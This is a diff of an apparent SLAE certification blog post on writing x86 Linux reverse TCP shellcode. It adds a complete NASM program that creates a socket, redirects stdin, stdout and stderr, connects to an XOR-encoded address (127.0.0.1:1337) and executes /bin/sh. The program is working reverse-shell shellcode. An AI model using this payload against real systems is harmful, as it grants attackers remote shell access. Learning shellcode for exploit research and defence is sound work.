@@ -19,18 +19,6 @@ Create a Shell_Reverse_TCP shellcode that;
 1. Connects to an easily configurable IP address and port number
 2. Executes a shell on a successful connection
 
-### Create a TCP Socket
-`int socket(int domain, int type, int protocol);`
-
-### Connect TCP Socket to IP Socket Address Structure
-`int connect(int sockfd, const struct sockaddr *addr, socklen_t addrlen);`
-
-### Direct Connection Socket Output
-`int dup2(int oldfd, int newfd);`
-
-### Execute Program
-`int execve(const char *pathname, char *const argv[], char *const envp[]);`
-
 ## MSFVenom Shellcode Under the Microscope
 We can analyze what a bind or reverse shell would look like by looking at the C function calls. In this case, I thought it would be fun to see what 
 msfvenom was doing and to my surprise, I found an interesting artifact while comparing code snippets to my dissassembly. The major difference is that 
@@ -220,6 +208,72 @@ push ebx                ; Push *filename
 mov ecx, esp            ; Store memory address pointing to memory address of "/bin/sh"
 mov al, 0xb             ; execve call
 int 0x80                ; interrupt
+```
+# Complete Assembly Program
+
+```nasm
+global _start   ; Standard start
+                ;
+section .text   ;
+_start:         ;
+	
+	;init
+	xor ebx, ebx    ; Zero out registers before usage to avoid a logic error
+	xor ecx, ecx    ;
+	xor edx, edx    ;
+	mul cx          ; ax = ax * cx (0)
+	
+	;socket
+	push ebx        ; push 0x0
+	push 0x1        ; 1 = SOCK_STREAM
+	push 0x2        ; 2 = AF_INET
+	mov al, 0x66    ; socketcall syscall
+	mov bl, 0x1     ; sys_socket = 1
+	mov ecx, esp    ; *args pointer
+	int 0x80        ; interrupt
+	
+	;dup2
+	xchg ebx, eax   ; swap oldfd into ebx (should be 0x3)
+	xor ecx, ecx    ; clear eax
+	mov cl, 3 	; 3 file descriptors (stdin, stdout, stderr)
+
+	dup_descriptors:
+		dec cl  ; hack for loop to work with values 2,1,0 instead of 3,2,1
+		mul edx ; zero out eax
+		mov al, 0x3f
+		int 0x80 ; dup2 stdin
+		inc cl  ; hack for loop to work with values 2,1,0 instead of 3,2,1
+		loop dup_descriptors
+
+	;connect	
+	mov al, 0x66        ; socketcall wrapper
+	mov ebx, 0x3	    ; move 3 into ebx
+	mov edi, 0xffffffff ; 255.255.255.255
+	mov ecx, 0xfeffff80 ; 128.255.255.254
+	xor ecx, edi        ; 0x0100007f = 127.0.0.1
+	
+	push ecx            ; sin_addr.s_addr 127.0.0.1 
+	push word 0x5c11    ; sin_port 1337
+	push word 0x02      ; sin_family 0x2
+	mov ecx, esp        ; move connect *args to ecx. this also points to IP Socket Address Struct 
+
+	push 0x10           ; addrlen (socket)
+	push ecx            ; pointer to IP Struct
+	push ebx            ; sockfd	
+	mov ecx, esp	    ; move esp pointer into ecx
+	int 0x80            ; interrupt
+
+	;execve
+	push edx                ; delimiting NULL for pathname; EDX is NULL for envp[]
+	push dword 0x68732f2f   ; push / / s h
+	push dword 0x6e69622f   ; push / b i n
+	mov ebx, esp            ; Store pointer to "/bin/sh" in ebx
+	push edx                ; Push NULL
+	push ebx                ; Push *filename
+	mov ecx, esp            ; Store memory address pointing to memory address of "/bin/sh"
+	mul edx			; clear eax
+	mov al, 0xb             ; execve call
+	int 0x80                ; interrupt
 ```
 
 _This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert certification:_
